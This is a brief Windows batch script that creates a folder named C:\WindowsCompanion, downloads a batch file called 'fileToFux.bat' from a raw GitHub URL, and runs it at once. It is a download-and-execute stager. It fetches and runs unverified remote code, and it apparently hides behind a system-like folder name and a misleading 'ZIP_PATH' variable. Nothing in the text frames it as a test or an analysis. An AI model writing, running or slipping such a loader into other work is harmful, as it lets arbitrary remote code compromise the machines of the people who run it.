@echo off
if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"

set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat

set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat

set DESTINATION_FOLDER=C:\WindowsCompanion

curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"

exit
